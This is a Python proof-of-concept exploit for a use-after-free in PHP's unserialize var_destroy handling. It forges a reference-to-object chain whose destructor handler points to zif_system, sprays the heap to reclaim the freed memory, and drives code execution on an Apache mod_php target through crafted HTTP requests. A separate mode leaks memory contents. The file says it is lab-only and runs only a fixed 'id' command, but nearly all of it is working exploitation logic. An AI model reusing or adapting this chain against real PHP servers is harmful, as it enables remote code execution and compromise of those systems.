#!/usr/bin/env python3
"""var_destroy UAF — LINK-W ladder proof (lab-only).

Builds the forged zend_reference -> zend_object -> handlers->dtor_obj =
zif_system chain inside a carrier string, reclaims the freed var_entries
extension chunk with the same-size spray, and re-enters unserialize() with an
out-of-range "R:1020;" that resolves to the spray's data[1] zval pointer.

Two modes:
  measure  — carrier filled with a magic pattern, worker sleeps; the carrier
             data address is read from /proc/<pid>/mem (calibration).
  fire     — the measured address + zif_system drive the forged chain; the
             fixed benign command writes the proof to /out/vd.

Usage:
  python3 poc/verify_vardestroy_rce.py --target 127.0.0.1:18130 measure
  python3 poc/verify_vardestroy_rce.py --target 127.0.0.1:18130 fire \
      --addr 0x... [--zif 0x...]

Lab-only; fixed benign command ("id>/out/vd 2>&1"); no arbitrary commands.
"""

import argparse
import base64
import os
import re
import socket
import subprocess
import sys
import threading
import time

MAGIC = b"VDUAFMAGIC0xdead"
MODE_MEASURE = 0
MODE_FIRE = 1
MODE_CAL = 2          # exact fire-layout build, then sleep (no UAF)
MAGIC_OFF = 0x800     # unused page inside the carrier


def http_get(host, port, path, timeout=60):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall((f"GET {path} HTTP/1.1\r\nHost: x\r\n"
               f"Connection: close\r\n\r\n").encode())
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out


def blob(mode, addr=0, zif=0, magic=MAGIC):
    b = bytes([mode]) + addr.to_bytes(8, "little") + zif.to_bytes(8, "little")
    b += magic.ljust(16, b"\x00")[:16]
    b = b.ljust(64, b"\x00")
    return base64.b64encode(b).decode()


def sh(container, cmd, timeout=60):
    return subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                          capture_output=True, text=True, timeout=timeout)


def worker_pid(container, wait=10.0):
    deadline = time.time() + wait
    while True:
        r = sh(container, "pgrep -x apache2 | grep -v '^1$' | sort -n | tail -1")
        pid = r.stdout.strip()
        if pid:
            return int(pid)
        if time.time() > deadline:
            sys.exit("no apache2 worker found")
        time.sleep(0.2)


def zif_system(target_addr, container):
    pid = worker_pid(container)
    m = sh(container, f"grep libphp /proc/{pid}/maps | head -1 | cut -d- -f1")
    base = int(m.stdout.strip(), 16)
    s = sh(container, "readelf -sW /usr/lib/apache2/modules/libphp.so "
                      "| grep -E ' zif_system$' | head -1")
    for line in s.stdout.splitlines():
        parts = line.split()
        if parts and parts[-1] == "zif_system":
            return base + int(parts[1], 16), base
    sys.exit("zif_system symbol not found")


def measure(host, port, container, runs=2):
    results = []
    for i in range(runs):
        path = "/vd.php?d=" + blob(MODE_CAL)
        t = threading.Thread(target=http_get, args=(host, port, path), daemon=True)
        t.start()
        time.sleep(1.5)
        pid = worker_pid(container)
        # doubled magic: only the carrier contains 32 contiguous bytes
        r = sh(container, f"php /var/www/html/vd_scan.php {pid} "
                          f"{(MAGIC + MAGIC).hex()}", timeout=120)
        addr = r.stdout.strip()
        print(f"    [measure {i}] pid={pid} carrier_data={addr or '<not found>'} "
              f"{r.stderr.strip()}")
        if addr:
            results.append(int(addr, 16) - MAGIC_OFF)
        t.join(timeout=25)
    return results


def fire(host, port, container, addr, zif, proof, latched=False, outdir=None):
    try:
        os.remove(proof)
    except FileNotFoundError:
        pass
    # clear the in-container proof too, or a prior run's uid= is a false positive
    sh(container, "rm -f /tmp/vd")

    if latched:
        # mode 5: the request sleeps while we scan /proc and latch the carrier
        addr_file = os.path.join(outdir, "vd_addr")
        try:
            os.remove(addr_file)
        except FileNotFoundError:
            pass
        path = "/vd.php?d=" + blob(5, 0, zif)
        holder = {}

        def _req():
            holder["resp"] = http_get(host, port, path, timeout=60)

        t = threading.Thread(target=_req, daemon=True)
        t.start()
        time.sleep(1.5)
        pid = worker_pid(container)
        r = sh(container, f"php /var/www/html/vd_scan.php {pid} "
                          f"{(MAGIC + MAGIC).hex()}", timeout=120)
        found = r.stdout.strip()
        if found:
            addr = int(found, 16) - MAGIC_OFF
            with open(addr_file, "w") as fh:
                fh.write(f"{addr:x}")
            print(f"    latched carrier {addr:#x}")
        else:
            print(f"    latch scan failed: {r.stderr.strip()}")
        t.join(timeout=40)
        resp = holder.get("resp", b"")
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<none>"
        print(f"    response: {status}")
        time.sleep(0.8)
        if os.path.exists(proof):
            body = open(proof, "rb").read()
            print(f"    proof: {body.decode('latin1', 'replace').strip()!r}")
            return b"uid=" in body
        r2 = sh(container, "cat /tmp/vd 2>/dev/null")
        if "uid=" in r2.stdout:
            print(f"    proof: {r2.stdout.strip()!r}")
            return True
        print("    proof: <missing>")
        return False
    path = "/vd.php?d=" + blob(MODE_FIRE, addr, zif)
    print(f"    forged zval  @ {addr + 0x100:#x}")
    print(f"    fake ref     @ {addr + 0x200:#x}")
    print(f"    fake object  @ {addr + 0x300:#x}")
    print(f"    zif_system   @ {zif:#x}")
    resp = http_get(host, port, path, timeout=60)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<none>"
    print(f"    response: {status}")
    time.sleep(0.8)
    if os.path.exists(proof):
        body = open(proof, "rb").read()
        print(f"    proof: {body.decode('latin1', 'replace').strip()!r}")
        return b"uid=" in body
    # fallback: proof written inside the container (/tmp/vd)
    r = sh(container, "cat /tmp/vd 2>/dev/null")
    if "uid=" in r.stdout:
        print(f"    proof: {r.stdout.strip()!r}")
        return True
    print("    proof: <missing>")
    return False


def read_probe(host, port, container, addr, target, outdir=None):
    """R3-L1: read 8 bytes at `target` through the UAF, reflected over HTTP.
    With addr==0, mode 4 latches: the request sleeps while we scan /proc and
    drop the carrier address into the shared /out dir."""
    latched = addr == 0 and outdir is not None
    mode = 4 if latched else 3
    path = "/vd.php?d=" + blob(mode, addr, target)
    if latched:
        addr_file = os.path.join(outdir, "vd_addr")
        try:
            os.remove(addr_file)
        except FileNotFoundError:
            pass
        holder = {}
        sh(container, "rm -f /tmp/vd_leak")

        def _req():
            holder["resp"] = http_get(host, port, path, timeout=60)

        t = threading.Thread(target=_req, daemon=True)
        t.start()
        time.sleep(1.5)
        pid = worker_pid(container)
        r = sh(container, f"php /var/www/html/vd_scan.php {pid} "
                          f"{(MAGIC + MAGIC).hex()}", timeout=120)
        found = r.stdout.strip()
        if found:
            data_addr = int(found, 16) - MAGIC_OFF
            with open(addr_file, "w") as fh:
                fh.write(f"{data_addr:x}")
            print(f"    latched carrier {data_addr:#x}")
        else:
            print(f"    latch scan failed: {r.stderr.strip()}")
        t.join(timeout=40)
        resp = holder.get("resp", b"")
    else:
        resp = http_get(host, port, path, timeout=60)
    body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else resp
    carrier = None
    got = None
    text = body.decode("latin1", "replace")
    # the worker aborts on the post-destructor double free; the harness
    # persists the read before that point, so prefer the file
    r = sh(container, "cat /tmp/vd_leak 2>/dev/null")
    if "LEAK:" in r.stdout:
        text = r.stdout
    for line in text.splitlines():
        if line.startswith("CARRIER:"):
            carrier = int(line[8:].strip(), 16)
            print(f"    carrier (self-scan) {carrier:#x}")
        if line.startswith("LEAK:"):
            got = bytes.fromhex(line[5:].strip())
            head = got[:8].hex()
            print(f"    read {len(got)} B, head={head} "
                  f"({int.from_bytes(got[:8], 'little'):#x})")
        if line.startswith("LEAK-TYPE:"):
            print(f"    read returned {line}")
    if got is None:
        print(f"    no LEAK line; response {body[:200]!r}")
    return carrier, got


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18130")
    ap.add_argument("--container", default="php2shell-pure-arm64")
    ap.add_argument("--addr", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--zif", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--latched", action="store_true",
                    help="mode 5: latch the carrier address in-request")
    ap.add_argument("--bias-zif", type=lambda x: int(x, 0), default=0,
                    help="shift zif_system (load-bearing control: non-zero "
                         "must NOT fire)")
    ap.add_argument("--proof", default=os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "lab-pure-modphp", "out", "vd"))
    ap.add_argument("--out-dir", default=os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "lab-pure-modphp", "out"),
        help="host dir bind-mounted at /out (latch address file)")
    ap.add_argument("mode", choices=["measure", "fire", "run", "read"])
    args = ap.parse_args()

    host, _, port = args.target.partition(":")
    port = int(port or 80)
    print("[*] var_destroy UAF — LINK-W forged-reference ladder")
    print(f"    target {args.target} container {args.container}")

    addr = args.addr
    if args.mode == "read":
        # addr=0 -> the harness self-locates via /proc/self/mem (lab oracle)
        target = args.zif if args.zif is not None else 0
        got_addr = args.addr if args.addr is not None else 0
        carrier, got = read_probe(host, port, args.container, got_addr, target,
                                  outdir=args.out_dir)
        if carrier is None or got is None:
            return 1
        # R3-L1 acceptance: the overread blob must contain the carrier's own
        # address (self-leak), at a stable offset within the disclosed region.
        needle = carrier.to_bytes(8, "little")
        offs = [i for i in range(len(got)) if got.startswith(needle, i)]
        print(f"    disclosed {len(got)} bytes; carrier self-pointer at "
              f"{[hex(o) for o in offs[:5]]}")
        ok = bool(offs)
        # also confirm the forged zval's value.str appears
        fstr = (carrier + 0x500).to_bytes(8, "little")
        print(f"    fake_str pointer present: {fstr in got}")
        print(f"    self-leak: {'PASS' if ok else 'FAIL'}")
        return 0 if ok else 1

    if args.mode in ("measure", "run"):
        addrs = measure(host, port, args.container)
        if not addrs:
            sys.exit("measurement failed")
        if len(set(addrs)) > 1:
            print(f"    [!] carrier address unstable across runs: {[hex(a) for a in addrs]}")
        addr = addrs[-1]

    if args.mode in ("fire", "run"):
        if addr is None and not args.latched:
            sys.exit("--addr required for fire (or --latched)")
        zif = args.zif
        if zif is None:
            zif, base = zif_system(args.target, args.container)
            print(f"    libphp base {base:#x}")
        if args.bias_zif:
            print(f"    [!] BIAS zif_system by {args.bias_zif:#x} "
                  f"(control: must not fire)")
            zif += args.bias_zif
        ok = fire(host, port, args.container, addr, zif, args.proof,
                  latched=args.latched, outdir=args.out_dir)
        print()
        print("[EVIDENCE] LINK-W: forged zend_reference -> zend_object -> "
              "dtor_obj == zif_system" if ok else "[!] no proof written")
        return 0 if ok else 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
